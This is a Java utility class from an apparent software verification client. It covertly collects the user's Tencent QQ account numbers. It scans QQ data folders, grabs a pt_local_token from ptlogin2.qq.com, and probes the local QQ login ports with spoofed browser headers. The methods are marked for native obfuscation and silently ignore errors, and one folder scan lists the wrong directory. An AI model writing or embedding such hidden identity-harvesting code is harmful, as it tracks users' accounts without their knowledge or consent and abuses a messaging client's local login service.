package tech.skidonion.verification.utils;

import tech.skidonion.obfuscator.annotations.NativeObfuscation;
import tech.skidonion.verification.json.Json;
import tech.skidonion.verification.json.JsonArray;
import tech.skidonion.verification.json.JsonObject;
import tech.skidonion.verification.json.JsonValue;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.regex.Pattern;

public class QQUtils {

    @NativeObfuscation.Inline
    private static AtomicInteger PORT;
    @NativeObfuscation.Inline
    private static String PT_LOCAL_TOKEN;
    @NativeObfuscation.Inline
    private static HashMap<String, String> HEADERS;

    @NativeObfuscation.Inline
    public static Set<String> getAllQQ() {
        Set<String> qqs = new HashSet<>();

        if (System.getProperty("os.name").toLowerCase().contains("windows")) {
            Pattern pattern = Pattern.compile("^[1-9][0-9]{4,10}$");

            Path defaultPath = Paths.get(System.getProperty("user.home"), "AppData", "Roaming", "Tencent", "Users");
            File defaultPathFile = defaultPath.toFile();

            if (defaultPathFile.exists() && defaultPathFile.isDirectory()) {
                File[] directoryFiles = defaultPathFile.listFiles();
                if (directoryFiles != null) {
                    for (File qqData : directoryFiles) {
                        String fileName = qqData.getName();
                        if (pattern.matcher(fileName).matches()) {
                            qqs.add(fileName);
                        }
                    }
                }
            }

            Path ntDefaultPath = Paths.get(System.getProperty("user.home"), "Documents", "Tencent Files", "nt_qq", "global", "nt_data", "Login");
            File ntDefaultPathFile = ntDefaultPath.toFile();
            if (defaultPathFile.exists() && ntDefaultPathFile.isDirectory()) {
                File[] directoryFiles = defaultPathFile.listFiles();
                if (directoryFiles != null) {
                    for (File qqData : directoryFiles) {
                        String fileName = qqData.getName();
                        if (pattern.matcher(fileName).matches()) {
                            qqs.add(fileName);
                        } else {
                            fileName = fileName.substring(1);
                            if (pattern.matcher(fileName).matches()) {
                                qqs.add(fileName);
                            }
                        }
                    }
                }
            }

            Path customPath = Paths.get(System.getenv("PUBLIC"), "Documents", "Tencent", "QQ", "UserDataInfo.ini");
            File customPathFile = customPath.toFile();

            if (customPathFile.exists() && customPathFile.isFile()) {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(Files.newInputStream(customPath)))) {
                    String dataLine;
                    while ((dataLine = reader.readLine()) != null) {
                        String[] keyValue = dataLine.split("=");
                        if (keyValue.length == 2) {
                            if (Objects.equals(keyValue[0], "UserDataSavePath")) {
                                File directory = new File(keyValue[1]);
                                if (directory.exists() && directory.isDirectory()) {
                                    File[] directoryFiles = directory.listFiles();
                                    if (directoryFiles != null) {
                                        for (File qqData : directoryFiles) {
                                            if (pattern.matcher(qqData.getName()).matches()) {
                                                qqs.add(qqData.getName());
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                } catch (IOException ignore) {
                }
            }
        }

        HEADERS = new HashMap<>();

        HEADERS.put("Accept-Encoding", "gzip, deflate, br");
        HEADERS.put("Accept-Language", "zh-CN,zh;q=0.9,ru;q=0.8");
        HEADERS.put("Cache-Control", "no-cache");
        HEADERS.put("Pragma", "no-cache");
        HEADERS.put("Referer", "https://xui.ptlogin2.qq.com/");
        HEADERS.put("Sec-Fetch-Dest", "script");
        HEADERS.put("Sec-Fetch-Mode", "no-cors");
        HEADERS.put("Sec-Fetch-Site", "same-site");
        HEADERS.put("sec-ch-ua", "\"Google Chrome\";v=\"117\", \"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"117\"");
        HEADERS.put("sec-ch-ua-mobile", "?0");
        HEADERS.put("sec-ch-ua-platform", "\"Windows\"");
        HEADERS.put("UserAgent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36");

        String url = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?s_url=mail.qq.com&style=20&appid=715021417&proxy_url=https%3A%2F%2Fhuifu.qq.com%2Fproxy.html";

        try {
            URL obj = new URL(url);
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("GET");

            PT_LOCAL_TOKEN = "";
            for (String s : con.getHeaderFields().get("Set-Cookie")) {
                String[] cookieParts = s.split(";");
                for (String part : cookieParts) {
                    String[] keyValue = part.trim().split("=");
                    if (keyValue.length == 2 && keyValue[0].equals("pt_local_token")) {
                        PT_LOCAL_TOKEN = keyValue[1];
                    }
                }
            }
            con.disconnect();

            HEADERS.put("Cookie", "pt_local_token=" + PT_LOCAL_TOKEN + "; PATH=/; DOMAIN=ptlogin2.qq.com; SameSite=None; Secure");

            ExecutorService executorService = Executors.newFixedThreadPool(10);
            List<Future<JsonArray>> futures = new ArrayList<>();

            PORT = new AtomicInteger(0);
            for (int i = 0; i < 9; i++) {
                Future<JsonArray> future = executorService.submit(QQUtils::request);
                futures.add(future);
            }
            List<JsonArray> results = new ArrayList<>();
            for (Future<JsonArray> future : futures) {
                try {
                    JsonArray result = future.get();
                    if (result != null) {
                        results.add(result);
                    }
                } catch (Exception ignore) {
                }
            }
            executorService.shutdown();

            List<Long> temp = new ArrayList<>();
            for (JsonArray result : results) {
                for (JsonValue element : result) {
                    try {
                        JsonObject object = element.asObject();
                        temp.add(object.get("uin").asLong());
                    } catch (Exception ignore) {
                    }
                }
            }
            for (long uin : temp) {
                qqs.add(Long.toString(uin));
            }
        } catch (Exception ignore) {
        }

        return qqs;
    }

    private static JsonArray request() {
        try {
            String data = HttpUtils.get("https://localhost.ptlogin2.qq.com:430" + PORT.getAndIncrement() + "/pt_get_uins?callback=ptui_getuins_CB&r=0.7078999698107045&pt_local_tk=" + PT_LOCAL_TOKEN, null, HEADERS);
            int startIndex = data.indexOf("[");
            int endIndex = data.indexOf("]");
            String jsonArrayString = data.substring(startIndex, endIndex + 1);
            return Json.parse(jsonArrayString).asArray();
        } catch (Exception e) {
            return null;
        }
    }

}
